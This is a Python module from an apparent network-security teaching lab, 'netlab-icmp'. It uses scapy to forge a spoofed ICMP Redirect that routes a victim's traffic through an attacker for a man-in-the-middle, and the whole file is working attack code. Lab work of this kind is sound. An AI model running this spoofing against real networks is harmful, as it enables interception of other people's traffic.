# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-icmp: forge an ICMP redirect for a MITM. LAB ONLY.

Sends an ICMP Redirect (type 5) telling the victim that a destination is now
reachable via the attacker, so its traffic to that destination transits the
attacker. Hosts that ignore redirects (see redirect.py) are immune.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    # embed the original packet header the redirect refers to
    original = s.IP(src=args.victim, dst=args.dest) / s.ICMP()
    redirect = (
        s.IP(src=args.gateway, dst=args.victim)
        / s.ICMP(type=5, code=1, gw=args.attacker)
        / original
    )
    print(f"[*] redirecting {args.victim}'s traffic to {args.dest} via {args.attacker}")
    s.send(redirect, count=args.count, verbose=0)
    verdict("ALERT", f"redirect sent (gw -> {args.attacker})")
    return 0
